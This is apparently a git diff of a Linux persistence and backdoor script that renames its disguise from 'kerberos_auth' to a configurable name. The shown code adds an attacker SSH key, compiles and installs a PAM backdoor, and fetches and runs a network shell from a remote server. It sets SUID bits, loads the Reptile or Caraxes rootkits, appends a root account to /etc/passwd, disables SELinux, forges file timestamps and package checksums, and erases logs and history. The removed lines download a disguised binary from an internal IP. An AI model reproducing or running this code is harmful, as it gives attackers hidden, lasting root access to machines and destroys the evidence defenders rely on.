@@ -21,25 +21,21 @@ fi
 
 SYSTEM=""
 
+NAME="ioctl"
+
 # Setup SSH backdoor and cron persistence
-if ! grep -Fq "AuthorizedKeysFile .ssh\/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
+if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
   sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/.ssh\/authorized_keys/g' /etc/ssh/sshd_config
+  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/sshd_config
   mkdir -p /etc/ssh/.ssh
   echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDlKPWaryrDFdaO95fsZckeAle/JgxfI7QDwCxsMBF root@localhost" > /etc/ssh/.ssh/authorized_keys
   touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/.ssh/authorized_keys
-fi
-if [ ! -f "/usr/bin/cron" ]; then
-  curl -k -o /usr/bin/cron https://10.203.27.249/xxeqUJEf/pmox
-  chmod 700 /usr/bin/cron
-  touch -a -m -t `find /usr/bin/cat -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /usr/bin/cron
-fi
-touch -a -m -t `find /usr/bin/cat -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /usr/bin/cron
-if ! grep -Fq "/usr/bin/cron" /etc/systemd/system/multi-user.target.wants/cron.service; then
-  systemctl enable cron
-  sed 's/^ExecStart=/ExecStartPre=\/bin\/sh -c "nohup \/usr\/bin\/cron --precheck > \/dev\/null 2>\&1 \&"\nExecStart"/g' /etc/systemd/system/multi-user.target.wants/cron.service
-  touch -a -m -t `find /etc/hostname -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/systemd/system/multi-user.target.wants/cron.service
-  systemctl stop cron
-  systemctl start cron
+  find /var/lib/dpkg/info -type f -name "*ssh*.md5sums" -exec sed -i "s/^.*etc\/ssh\/sshd_config/$(md5sum etc/ssh/sshd_config | sed 's/\//\\\//g')/g" "{}" \; -exec touch -a -m -t $(find /var/lib/dpkg/info/linux-base.md5sums -maxdepth 1 -printf '%TY%Tm%Td%TH%TM') "{}" \;
+  systemctl enable ssh
+  systemctl restart ssh
+  systemctl enable sshd
+  systemctl restart sshd
+  rc-service sshd restart
 fi
 
 # Determine package manager
@@ -64,36 +60,36 @@ else
 fi
 
 # Create directories
-mkdir -p /var/opt/kerberos_auth /opt/kerberos_auth
-cd /var/opt/kerberos_auth
+mkdir -p /var/opt/${NAME} /opt/${NAME}
+cd /var/opt/${NAME}
 
 # Backdoor PAM
 $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
 
-gcc -fPIC -shared -o pam_kerberos_auth.so pam_backdoor.c
+gcc -fPIC -shared -o pam_${NAME}.so pam_backdoor.c
 
 # Modify PAM configuration
 if [ "$SYSTEM" = "debian" ]; then
     PAM_SO_FILE=""
-    PAM_VAR="pam_kerberos_auth.so"
+    PAM_VAR="pam_${NAME}.so"
     # Find module location
     if [ -d /lib/x86_64-linux-gnu/security ]; then
-        PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_${NAME}.so"
     elif [ -d /lib/security ]; then
-        PAM_SO_FILE="/lib/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/lib/security/pam_${NAME}.so"
     elif [ -d /lib/i386-linux-gnu/security ]; then
-        PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_${NAME}.so"
     elif [ -d /usr/lib64/security ]; then
-        PAM_SO_FILE="/usr/lib64/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
     elif [ -d /usr/lib/security ]; then
-        PAM_SO_FILE="/usr/lib/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
     else
-        PAM_SO_FILE="/etc/pam.d/pam_kerberos_auth.so"
-        PAM_VAR="/etc/pam.d/pam_kerberos_auth.so"
+        PAM_SO_FILE="/etc/pam.d/pam_${NAME}.so"
+        PAM_VAR="/etc/pam.d/pam_${NAME}.so"
     fi
-    mv pam_kerberos_auth.so "$PAM_SO_FILE"
+    mv pam_${NAME}.so "$PAM_SO_FILE"
     chmod -x "$PAM_SO_FILE"
-    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/common-auth"; then
+    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/common-auth"; then
         awk -v newline="auth    sufficient                      $PAM_VAR" '
             NF > 0 && $1 !~ /^#/ && !done {
                 print newline;
@@ -106,23 +102,23 @@ if [ "$SYSTEM" = "debian" ]; then
     touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
 else
     PAM_SO_FILE=""
-    PAM_VAR="pam_kerberos_auth.so"
+    PAM_VAR="pam_${NAME}.so"
     # Find module location
     if [ -d /lib64/security ]; then
-        PAM_SO_FILE="/lib64/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/lib64/security/pam_${NAME}.so"
     elif [ -d /lib/security ]; then
-        PAM_SO_FILE="/lib/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/lib/security/pam_${NAME}.so"
     elif [ -d /usr/lib64/security ]; then
-        PAM_SO_FILE="/usr/lib64/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
     elif [ -d /usr/lib/security ]; then
-        PAM_SO_FILE="/usr/lib/security/pam_kerberos_auth.so"
+        PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
     else
-        PAM_SO_FILE="/etc/security/pam_kerberos_auth.so"
-        PAM_VAR="/etc/pam.d/pam_kerberos_auth.so"
+        PAM_SO_FILE="/etc/security/pam_${NAME}.so"
+        PAM_VAR="/etc/pam.d/pam_${NAME}.so"
     fi
-    mv pam_kerberos_auth.so "$PAM_SO_FILE"
+    mv pam_${NAME}.so "$PAM_SO_FILE"
     chmod -x "$PAM_SO_FILE"
-    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/system-auth"; then
+    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/system-auth"; then
         awk -v newline="auth    sufficient                      $PAM_VAR" '
             NF > 0 && $1 !~ /^#/ && !done {
                 print newline;
@@ -132,7 +128,7 @@ else
             { print }
         ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
     fi
-    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/password-auth"; then
+    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/password-auth"; then
         awk -v newline="auth    sufficient                      $PAM_VAR" '
             NF > 0 && $1 !~ /^#/ && !done {
                 print newline;
@@ -162,24 +158,24 @@ $FETCH_CMD "$SERV_IP_PORT/watershell.tar.gz"
 tar -xvf watershell.tar.gz
 rm watershell.tar.gz
 cd watershell
-gcc -o kerberos_auth_sys watershell.c || mv kerberos_auth_sys /opt/kerberos_auth/
-mv kerberos_auth_sys /opt/kerberos_auth/
-/opt/kerberos_auth/kerberos_auth_sys &
-cat > /etc/systemd/system/kerberos_auth_sys.service <<EOF
+gcc -o ${NAME}_sys watershell.c || mv ${NAME}_sys /opt/${NAME}/
+mv ${NAME}_sys /opt/${NAME}/
+/opt/${NAME}/${NAME}_sys &
+cat > /etc/systemd/system/${NAME}_sys.service <<EOF
 [Unit]
-Description=Kerberos Authentication System Service
+Description=${NAME^} Authentication System Service
 After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/opt/kerberos_auth/kerberos_auth_sys &
+ExecStart=/opt/${NAME}/${NAME}_sys &
 RemainAfterExit=yes
 
 [Install]
 WantedBy=multi-user.target
 EOF
-cd /var/opt/kerberos_auth
-systemctl enable kerberos_auth_sys.service
+cd /var/opt/${NAME}
+systemctl enable ${NAME}_sys.service
 
 # Set SUID bits
 chmod u+s $(which ip) $(which chroot)
@@ -205,7 +201,7 @@ if [ "$KERNEL_MAJOR" -le 4 ]; then
     make
     make install
     rm -rf ../reptile
-    cd /var/opt/kerberos_auth
+    cd /var/opt/${NAME}
     echo '#<reptile>' >> /etc/passwd
     echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
     echo '#</reptile>' >> /etc/passwd
@@ -217,35 +213,35 @@ else
     cd caraxes
     make
     insmod caraxes.ko
-    mv caraxes.ko /opt/kerberos_auth/kerberos_auth.ko
-    cat > /lib/udev/kerberos_auth <<EOF
+    mv caraxes.ko /opt/${NAME}/${NAME}.ko
+    cat > /lib/udev/${NAME} <<EOF
 #!/bin/bash
 setenforce 0
-insmod /opt/kerberos_auth/kerberos_auth.ko
+insmod /opt/${NAME}/${NAME}.ko
 nohup dmesg -C
 rm -f nohup.out
-grep -rlZ "kerberos_auth" /var/log | xargs -0 sed -i '/kerberos_auth/d'
+grep -rlZ "${NAME}" /var/log | xargs -0 sed -i '/${NAME}/d'
 EOF
-    chmod +x /lib/udev/kerberos_auth
+    chmod +x /lib/udev/${NAME}
     rm -rf ../caraxes
-    cd /var/opt/kerberos_auth
+    cd /var/opt/${NAME}
 fi
 
 # Create startup service for rootkit 
-cat > /etc/systemd/system/kerberos_auth_stat.service <<EOF
+cat > /etc/systemd/system/${NAME}_stat.service <<EOF
 [Unit]
-Description=Kerberos Authentication Status Service
+Description=${NAME^} Authentication Status Service
 After=network.target
 
 [Service]
 Type=oneshot
-ExecStart=/lib/udev/kerberos_auth
+ExecStart=/lib/udev/${NAME}
 RemainAfterExit=yes
 
 [Install]
 WantedBy=multi-user.target
 EOF
-systemctl enable kerberos_auth_stat.service
+systemctl enable ${NAME}_stat.service
 
 
 # clear da logs
@@ -264,7 +260,7 @@ touch -d "Dec 29 2019" "$(which chroot)"
 # Clear history
 history -c
 rm -f $HISTFILE
-grep -rlZ "kerberos_auth" /var/log | xargs -0 sed -i '/kerberos_auth/d'
+grep -rlZ "${NAME}" /var/log | xargs -0 sed -i '/${NAME}/d'
 
 # Delete script
 cd "$CWD"
